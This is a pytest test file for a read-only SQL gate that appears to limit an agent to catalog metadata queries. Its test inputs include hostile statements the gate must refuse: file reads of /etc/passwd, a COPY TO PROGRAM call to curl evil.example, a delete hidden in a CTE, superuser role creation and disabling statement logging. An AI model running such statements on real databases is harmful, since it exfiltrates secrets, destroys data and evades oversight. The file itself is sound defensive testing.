import pytest

from datahub.ingestion.agent.sql_gate import SqlScopeError, check_query_scope
from datahub.ingestion.source.sql.postgres.source import PostgresConfig

CATALOG_QUERY = (
    "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'"
)


def test_permits_a_catalog_only_select():
    check_query_scope(CATALOG_QUERY, platform="postgres")


def test_permits_a_catalog_reference_qualified_by_database():
    check_query_scope(
        "SELECT table_name FROM mydb.information_schema.tables", platform="postgres"
    )


def test_pg_catalog_is_permitted_only_because_postgres_declares_it():
    # No longer central. The gate's default is information_schema and nothing else,
    # so pg_catalog is reachable only through PostgresConfig's declaration -- which
    # is the point: a central table had to know every dialect and did not.

    query = "SELECT relname FROM pg_catalog.pg_class"
    with pytest.raises(SqlScopeError, match="outside the catalog metadata"):
        check_query_scope(query, platform="postgres")
    check_query_scope(
        query, platform="postgres", scope=PostgresConfig.probe_catalog_scope()
    )


def test_rejects_a_user_table():
    with pytest.raises(SqlScopeError, match="public.orders"):
        check_query_scope("SELECT * FROM public.orders", platform="postgres")


def test_rejects_an_unqualified_table():
    # An unqualified name cannot be shown to be catalog metadata, so it is refused
    # rather than assumed safe.
    with pytest.raises(SqlScopeError, match="orders"):
        check_query_scope("SELECT * FROM orders", platform="postgres")


def test_rejects_multiple_statements():
    with pytest.raises(SqlScopeError, match="single statement"):
        check_query_scope(
            f"{CATALOG_QUERY}; SELECT * FROM public.orders", platform="postgres"
        )


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO public.orders (id) VALUES (1)",
        "UPDATE public.orders SET id = 1",
        "DELETE FROM public.orders",
        "DROP TABLE public.orders",
        "CREATE TABLE public.t (id INT)",
    ],
)
def test_rejects_anything_that_is_not_a_select(sql):
    with pytest.raises(SqlScopeError):
        check_query_scope(sql, platform="postgres")


def test_permits_a_cte_over_catalog_tables():
    # A CTE alias is not an unqualified table reference; refusing it would make
    # the gate reject legitimate catalog queries.
    check_query_scope(
        "WITH cols AS (SELECT table_name FROM information_schema.columns) "
        "SELECT * FROM cols",
        platform="postgres",
    )


def test_rejects_a_user_table_hidden_inside_a_cte():
    with pytest.raises(SqlScopeError, match="public.orders"):
        check_query_scope(
            "WITH x AS (SELECT * FROM public.orders) "
            "SELECT * FROM information_schema.tables",
            platform="postgres",
        )


def test_rejects_a_user_table_in_a_union_branch():
    with pytest.raises(SqlScopeError, match="public.orders"):
        check_query_scope(
            "SELECT table_name FROM information_schema.tables "
            "UNION ALL SELECT name FROM public.orders",
            platform="postgres",
        )


def test_rejects_a_user_table_in_a_subquery():
    with pytest.raises(SqlScopeError, match="public.orders"):
        check_query_scope(
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_name IN (SELECT name FROM public.orders)",
            platform="postgres",
        )


def test_rejects_a_user_table_joined_to_a_catalog_table():
    with pytest.raises(SqlScopeError, match="public.orders"):
        check_query_scope(
            "SELECT t.table_name FROM information_schema.tables t "
            "JOIN public.orders o ON o.name = t.table_name",
            platform="postgres",
        )


def test_rejects_an_unresolvable_platform():
    # Guessing a dialect would parse the query against the wrong grammar, so an
    # unknown platform refuses rather than falling back.
    with pytest.raises(SqlScopeError, match="dialect"):
        check_query_scope(CATALOG_QUERY, platform="not_a_real_platform")


def test_rejects_unparseable_sql():
    with pytest.raises(SqlScopeError, match="parse"):
        check_query_scope("SELECT FROM WHERE ((", platform="postgres")


def test_rejects_an_empty_query():
    with pytest.raises(SqlScopeError):
        check_query_scope("   ", platform="postgres")


def test_permits_information_schema_on_snowflake():
    check_query_scope(
        "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES", platform="snowflake"
    )


def test_rejects_snowflake_account_usage_query_history():
    # ACCOUNT_USAGE.QUERY_HISTORY.QUERY_TEXT holds the literal text of customer
    # queries, including values in WHERE clauses. It is refused because
    # ACCOUNT_USAGE is not one of the permitted schemas -- not by the query-text
    # exclusion list, which never sees it. Asserting the schema wording keeps the
    # two mechanisms from being confused if either changes.
    with pytest.raises(SqlScopeError, match="(?i)outside the catalog metadata"):
        check_query_scope(
            "SELECT query_text FROM snowflake.account_usage.query_history",
            platform="snowflake",
        )


def test_rejects_snowflakes_query_history_table_function():
    # This is Snowflake's actual "in a catalog schema but not metadata" case:
    # INFORMATION_SCHEMA.QUERY_HISTORY() is a table function inside a permitted
    # schema, so the schema rule clears it and the vendor-function rule is what
    # refuses it. A name-based exclusion list would have to know the function
    # exists; refusing the whole exp.Anonymous class does not.
    for query in (
        "SELECT * FROM information_schema.query_history()",
        "SELECT * FROM TABLE(information_schema.query_history())",
    ):
        with pytest.raises(SqlScopeError, match="(?i)vendor-specific function"):
            check_query_scope(query, platform="snowflake")


def _postgres_scope():

    return PostgresConfig.probe_catalog_scope()


def test_rejects_pg_stat_statements():
    # The Postgres analogue of query history: normalized query text, still
    # carrying literals in many configurations.
    with pytest.raises(SqlScopeError, match="(?i)pg_stat_statements"):
        check_query_scope(
            "SELECT query FROM pg_catalog.pg_stat_statements",
            platform="postgres",
            scope=_postgres_scope(),
        )


def test_catalog_matching_is_case_insensitive():
    check_query_scope(
        "SELECT table_name FROM INFORMATION_SCHEMA.TABLES", platform="postgres"
    )


def test_rejects_a_function_in_table_position_inside_a_catalog_schema():
    # Living in pg_catalog does not make a set-returning function metadata.
    with pytest.raises(SqlScopeError, match="pg_ls_dir"):
        check_query_scope(
            "SELECT * FROM pg_catalog.pg_ls_dir('/')", platform="postgres"
        )


def test_rejects_an_unqualified_function_in_table_position():
    with pytest.raises(SqlScopeError, match="pg_read_file"):
        check_query_scope(
            "SELECT * FROM pg_read_file('/etc/passwd')", platform="postgres"
        )


def test_rejects_dblink():
    with pytest.raises(SqlScopeError, match="dblink"):
        check_query_scope(
            "SELECT * FROM dblink('dbname=x', 'SELECT * FROM orders') AS t(a text)",
            platform="postgres",
        )


def test_rejects_a_vendor_function_with_no_table_reference():
    # The sharpest gap in a table-based check: a projection-only call reaches
    # data without naming a table at all, so walking tables never sees it.
    with pytest.raises(SqlScopeError, match="pg_read_file"):
        check_query_scope("SELECT pg_read_file('/etc/passwd')", platform="postgres")


def test_permits_standard_functions_over_catalog_tables():
    # Only vendor-specific functions sqlglot does not model are refused;
    # ordinary SQL must still work or the gate is unusable.
    check_query_scope(
        "SELECT count(*) FROM information_schema.tables WHERE table_name LIKE 'a%'",
        platform="postgres",
    )


def test_permits_bigquery_dataset_qualified_information_schema():
    # BigQuery addresses it as <dataset>.INFORMATION_SCHEMA.<VIEW>, and because
    # BigQuery table names may contain dots its dialect parses the last two
    # parts as one name -- so the schema marker is not in the `db` slot.
    check_query_scope(
        "SELECT table_name FROM mydataset.INFORMATION_SCHEMA.TABLES",
        platform="bigquery",
    )


def test_permits_bigquery_project_qualified_information_schema():
    check_query_scope(
        "SELECT table_name FROM myproject.mydataset.INFORMATION_SCHEMA.TABLES",
        platform="bigquery",
    )


def test_rejects_a_bigquery_user_table():
    with pytest.raises(SqlScopeError, match="orders"):
        check_query_scope(
            "SELECT * FROM myproject.mydataset.orders", platform="bigquery"
        )


def test_error_names_the_offending_table():
    # The agent has to be able to rewrite the query, so the message must say
    # which reference failed rather than only that something did.
    with pytest.raises(SqlScopeError) as exc:
        check_query_scope("SELECT * FROM analytics.events", platform="postgres")
    assert "analytics.events" in str(exc.value)


@pytest.mark.parametrize(
    "sql,expected",
    [
        ("INSERT INTO public.t (id) VALUES (1)", "INSERT"),
        ("UPDATE public.t SET id = 1", "UPDATE"),
        ("DELETE FROM public.t", "DELETE"),
        ("DROP TABLE public.t", "DROP"),
        ("CREATE TABLE public.t (id INT)", "CREATE"),
    ],
)
def test_a_write_statement_is_named_by_its_sql_keyword(sql, expected):
    with pytest.raises(SqlScopeError, match=expected):
        check_query_scope(sql, platform="postgres")


def test_an_unmodelled_statement_does_not_leak_a_parser_node_name():
    # FLUSH PRIVILEGES parses to an Alias node, so the message used to read
    # "got ALIAS" -- a sqlglot internal that tells a caller nothing and reads
    # like a bug in their own query. The refusal is the agent's only signal for
    # how to rewrite, so it has to be in SQL terms.
    with pytest.raises(SqlScopeError) as exc:
        check_query_scope("FLUSH PRIVILEGES", platform="mysql")
    message = str(exc.value)
    assert "ALIAS" not in message.upper()
    assert "SELECT" in message


# --- a write hidden inside a read ------------------------------------------
#
# The gate type-checked only the ROOT node. A Postgres data-modifying CTE puts
# the write inside a query, so
#
#   WITH orders AS (SELECT 1), x AS (DELETE FROM orders RETURNING 1)
#   SELECT * FROM x
#
# parses to a Select -- an exp.Query -- and cleared a gate whose entire
# promise is read-only. The unqualified DELETE target was then excused by
# _visible_cte_names as "a CTE alias reads as an unqualified table", true of a
# read reference and false of a write target: Postgres resolves the DELETE to
# the real table.
#
# Proven end to end against a live Postgres 16 before the fix: `probe run sql`
# exited 0 with a normal-looking result and the table went from 3 rows to 0.
#
# The pre-existing test covered only top-level DML, which is exactly why this
# survived it.


@pytest.mark.parametrize(
    "sql",
    [
        # Each shadows the CTE name over the real table, which is what made
        # the unqualified target look like a CTE reference.
        "WITH orders AS (SELECT 1), x AS (DELETE FROM orders RETURNING 1) SELECT * FROM x",
        "WITH orders AS (SELECT 1), x AS (INSERT INTO orders VALUES (1) RETURNING 1) SELECT * FROM x",
        "WITH orders AS (SELECT 1), x AS (UPDATE orders SET a=1 RETURNING 1) SELECT * FROM x",
        "WITH t AS (SELECT 1), x AS (DROP TABLE t) SELECT * FROM x",
        # Without the shadowing, so the table is qualified and in scope --
        # this must be refused for being a write, not for being out of scope.
        "WITH x AS (DELETE FROM information_schema.tables RETURNING 1) SELECT * FROM x",
    ],
)
def test_a_write_inside_a_cte_is_still_a_write(sql):
    with pytest.raises(SqlScopeError):
        check_query_scope(sql, platform="postgres", scope=_postgres_scope())


def test_the_refusal_says_it_is_a_write_not_a_scope_problem():
    """The message decides what the agent does next. "out of scope" sends it
    to qualify the table; it needs to be told the statement writes."""
    with pytest.raises(SqlScopeError, match="DELETE"):
        check_query_scope(
            "WITH x AS (DELETE FROM information_schema.tables RETURNING 1) "
            "SELECT * FROM x",
            platform="postgres",
            scope=_postgres_scope(),
        )


@pytest.mark.parametrize(
    "sql",
    [
        "WITH t AS (SELECT table_name FROM information_schema.tables) SELECT * FROM t",
        "WITH a AS (SELECT 1), b AS (SELECT * FROM a) SELECT * FROM b",
        "SELECT * FROM information_schema.tables",
    ],
)
def test_an_ordinary_cte_query_still_works(sql):
    """The control. Refusing every WITH would be a cheap way to pass the tests
    above and would break the legitimate catalog queries CTEs are used for."""
    check_query_scope(sql, platform="postgres", scope=_postgres_scope())


# --- everything that is not a read -----------------------------------------
#
# Grouped by what the statement ACHIEVES, not by keyword, because both gaps
# found here were spelled like reads: a data-modifying CTE parses to a Select,
# and `SELECT ... INTO` puts the table it creates in an `into` arg rather than
# a Create node. A statement-type check reading the root saw neither.
#
# SELECT INTO was refused before this only when its target happened to be
# unqualified -- `SELECT * INTO information_schema.evil FROM
# information_schema.tables` named a target inside the permitted schema and
# passed. Caught by accident is not caught.


@pytest.mark.parametrize(
    "dialect,sql",
    [
        # writes data
        (
            "tsql",
            "SELECT * INTO information_schema.evil FROM information_schema.tables",
        ),
        (
            "postgres",
            "WITH x AS (INSERT INTO information_schema.t VALUES (1) RETURNING 1) SELECT * FROM x",
        ),
        (
            "postgres",
            "CREATE TABLE information_schema.x AS SELECT * FROM information_schema.tables",
        ),
        ("postgres", "TRUNCATE information_schema.tables"),
        ("postgres", "CREATE TEMP TABLE t AS SELECT 1"),
        ("snowflake", "CREATE OR REPLACE VIEW information_schema.v AS SELECT 1"),
        # writes a file, or hands one to a program
        ("postgres", "COPY (SELECT * FROM information_schema.tables) TO '/tmp/out'"),
        ("postgres", "COPY information_schema.tables TO PROGRAM 'curl evil.example'"),
        ("mysql", "SELECT * FROM information_schema.tables INTO OUTFILE '/tmp/x'"),
        ("mysql", "SELECT * FROM information_schema.tables INTO DUMPFILE '/tmp/x'"),
        ("snowflake", "COPY INTO 's3://bucket/x' FROM information_schema.tables"),
        ("bigquery", "EXPORT DATA OPTIONS(uri='gs://b/x') AS SELECT 1"),
        # changes who can do what
        ("postgres", "GRANT SELECT ON information_schema.tables TO PUBLIC"),
        ("postgres", "REVOKE ALL ON information_schema.tables FROM PUBLIC"),
        ("postgres", "CREATE ROLE evil SUPERUSER"),
        ("postgres", "ALTER USER u WITH PASSWORD 'x'"),
        # runs code the gate cannot see into
        ("postgres", "DO $$ BEGIN PERFORM 1; END $$"),
        ("postgres", "CALL some_proc()"),
        ("tsql", "EXEC sp_executesql N'SELECT 1'"),
        ("snowflake", "EXECUTE IMMEDIATE 'SELECT 1'"),
        # changes session or system state
        ("postgres", "SET search_path TO evil"),
        ("snowflake", "ALTER SESSION SET QUERY_TAG = 'x'"),
        ("postgres", "ALTER SYSTEM SET log_statement = 'none'"),
        # takes locks a production writer would wait on
        ("postgres", "SELECT * FROM information_schema.tables FOR UPDATE"),
        ("postgres", "SELECT * FROM information_schema.tables FOR SHARE"),
        ("postgres", "LOCK TABLE information_schema.tables IN ACCESS EXCLUSIVE MODE"),
    ],
)
def test_a_statement_that_is_not_a_read_is_refused(dialect, sql):
    with pytest.raises(SqlScopeError):
        check_query_scope(sql, platform=dialect, scope=_postgres_scope())


@pytest.mark.parametrize(
    "dialect,sql",
    [
        ("postgres", "SELECT * FROM information_schema.tables"),
        (
            "postgres",
            "WITH t AS (SELECT table_name FROM information_schema.tables) SELECT * FROM t",
        ),
        ("postgres", "SELECT count(*) FROM information_schema.columns"),
    ],
)
def test_an_ordinary_catalog_read_still_works(dialect, sql):
    """The control for the whole list above. Refusing everything would pass
    every case in it and make the command useless."""
    check_query_scope(sql, platform=dialect, scope=_postgres_scope())
